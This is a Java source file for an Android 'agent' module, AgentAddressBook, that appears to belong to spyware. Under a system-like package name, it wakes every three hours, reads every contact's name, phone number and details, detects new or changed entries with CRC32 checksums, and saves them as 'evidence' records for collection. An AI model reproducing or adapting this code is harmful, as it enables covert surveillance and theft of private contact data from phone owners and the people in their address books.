package com.android.service.agent;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.ListIterator;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

import com.android.service.LogR;
import com.android.service.Status;
import com.android.service.agent.task.Contact;
import com.android.service.agent.task.PhoneInfo;
import com.android.service.agent.task.PickContact;
import com.android.service.agent.task.UserInfo;
import com.android.service.auto.Cfg;
import com.android.service.conf.ConfAgent;
import com.android.service.crypto.Encryption;
import com.android.service.evidence.EvidenceType;
import com.android.service.evidence.Markup;
import com.android.service.util.Check;
import com.android.service.util.DataBuffer;
import com.android.service.util.DateTime;
import com.android.service.util.Utils;
import com.android.service.util.WChar;

public class AgentAddressBook extends BaseAgent {

	private static final String TAG = "AgentAddressbook"; //$NON-NLS-1$
	private static final int FLAG_RECUR = 0x00000008;
	private static final int FLAG_RECUR_NoEndDate = 0x00000010;
	private static final int FLAG_ALLDAY = 0x00000040;
	
	private static final int POOM_STRING_SUBJECT = 0x01000000;
	private static final int POOM_STRING_CATEGORIES = 0x02000000;
	private static final int POOM_STRING_BODY = 0x04000000;
	private static final int POOM_STRING_RECIPIENTS = 0x08000000;
	private static final int POOM_STRING_LOCATION = 0x10000000;
	private static final int POOM_OBJECT_RECUR = 0x80000000;
	
	private PickContact contact;

	Markup markupContacts;

	HashMap<Long, Long> contacts; // (contact.id, contact.pack.crc)

	public AgentAddressBook() {

	}

	@Override
	public boolean parse(ConfAgent conf) {
		return true;
	}

	/**
	 * unserialize the contacts crc hashtable
	 */
	@Override
	public void actualStart() {
		// every three hours, check.
		setPeriod(180 * 60 * 1000);
		setDelay(200);

		markupContacts = new Markup(this);

		// the markup exists, try to read it
		if (markupContacts.isMarkup()) {
			try {
				contacts = (HashMap<Long, Long>) markupContacts.readMarkupSerializable();
			} catch (final IOException e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Error (begin): cannot read markup");//$NON-NLS-1$
				}
			}
		}

		

		// if no markup available, create a new empty one
		if (contacts == null) {
			contacts = new HashMap<Long, Long>();
			serializeContacts();
		}

	
	}

	/**
	 * serialize contacts in the markup
	 */
	private void serializeContacts() {
		if (Cfg.DEBUG) {
			Check.ensures(contacts != null, "null contacts"); //$NON-NLS-1$
		}

		try {

			final boolean ret = markupContacts.writeMarkupSerializable(contacts);
			if (Cfg.DEBUG) {
				Check.ensures(ret, "cannot serialize"); //$NON-NLS-1$
			}
		} catch (final IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error (serializeContacts): " + e);//$NON-NLS-1$
			}
		}
	}


	/**
	 * Every once and then read the contactInfo, and Check.every change. If
	 * //$NON-NLS-1$ something is new the contact is saved.
	 */
	@Override
	public void actualGo() {
		try {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (go): Contacts");
			}
			if (contacts()) {
				serializeContacts();
			}
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (go) Error: " + ex);
			}
		}

	}

	
	

	private boolean contacts() {
		contact = new PickContact();

		final Date before = new Date();
		final List<Contact> list = contact.getContactInfo();
		final Date after = new Date();
		if (Cfg.DEBUG) {
			Check.log(TAG + " (go): get contact time s " + (after.getTime() - before.getTime()) / 1000);//$NON-NLS-1$
		}
		if (Cfg.DEBUG) {
			Check.log(TAG + " (go): list size = " + list.size());//$NON-NLS-1$
		}

		final ListIterator<Contact> iter = list.listIterator();

		boolean needToSerialize = false;

		// for every Contact
		while (iter.hasNext()) {
			final Contact c = iter.next();

			// calculate the crc of the contact
			final byte[] packet = preparePacket(c);
			// if(Cfg.DEBUG) Check.log( TAG + " (go): "  ;//$NON-NLS-1$
			// Utils.byteArrayToHex(packet));
			final Long crcOld = contacts.get(c.getId());
			final Long crcNew = Encryption.CRC32(packet);
			// if(Cfg.DEBUG) Check.log( TAG + " (go): " + crcOld + " <-> "  ;//$NON-NLS-1$
			// crcNew);

			// if does not match, save and serialize
			if (!crcNew.equals(crcOld)) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (go): new contact. " + c);//$NON-NLS-1$
				}
				contacts.put(c.getId(), crcNew);
				saveEvidenceContact(c.getId(), packet);
				needToSerialize = true;
				Thread.yield();
			}
		}

		return needToSerialize;
	}

	/**
	 * Save evidence AddressBook
	 * 
	 * @param c
	 */
	private void saveEvidenceContact(long idContact, byte[] packet) {

		// contacts.put(idContact, Encryption.CRC32(packet));

		final LogR log = new LogR(EvidenceType.ADDRESSBOOK);
		log.write(packet);
		log.close();
	}

	


	/**
	 * Prepare the packet from the contact
	 * 
	 * @param c
	 * @return
	 */
	private byte[] preparePacket(Contact c) {
		final UserInfo user = c.getUserInfo();
		// List<EmailInfo> email = c.getEmailInfo();
		// List<PostalAddressInfo> paInfo = c.getPaInfo();
		final List<PhoneInfo> phoneInfo = c.getPhoneInfo();
		// List<ImInfo> imInfo = c.getImInfo();
		// List<OrganizationInfo> orgInfo = c.getOrgInfo();
		// List<WebsiteInfo> webInfo = c.getWebInfo();
		final long uid = user.getUserId();
		final String name = user.getCompleteName();

		final int version = 0x01000000;

		// final byte[] header = new byte[12];

		final ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
		// Adding header
		try {
			outputStream.write(Utils.intToByteArray(0)); // size
			outputStream.write(Utils.intToByteArray(version));
			outputStream.write(Utils.intToByteArray((int) uid));
		} catch (IOException ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (preparePacket) Error: " + ex);
			}
			return null;
		}

		final String message = c.getInfo();

		addTypedString(outputStream, (byte) 0x01, name);
		if (phoneInfo.size() > 0) {
			final String number = phoneInfo.get(0).getPhoneNumber();
			addTypedString(outputStream, (byte) 0x07, number);
		}
		addTypedString(outputStream, (byte) 0x37, message);

		final byte[] payload = outputStream.toByteArray();

		final int size = payload.length;

		// a questo punto il payload e' pronto
		final DataBuffer db_header = new DataBuffer(payload, 0, 4);
		db_header.writeInt(size);

		return payload;
	}

	private void addTypedString(ByteArrayOutputStream outputStream, byte type, String name) {
		if (name != null && name.length() > 0) {
			final int header = (type << 24) | (name.length() * 2);

			try {
				outputStream.write(Utils.intToByteArray(header));
				outputStream.write(WChar.getBytes(name, false));
			} catch (final IOException e) {
				if (Cfg.DEBUG) {
					Check.log(e);//$NON-NLS-1$
				}
				if (Cfg.DEBUG) {
					Check.log(TAG + " Error (addTypedString): " + e);//$NON-NLS-1$
				}
			}
		}
	}

	

	@Override
	public void actualStop() {

	}
}
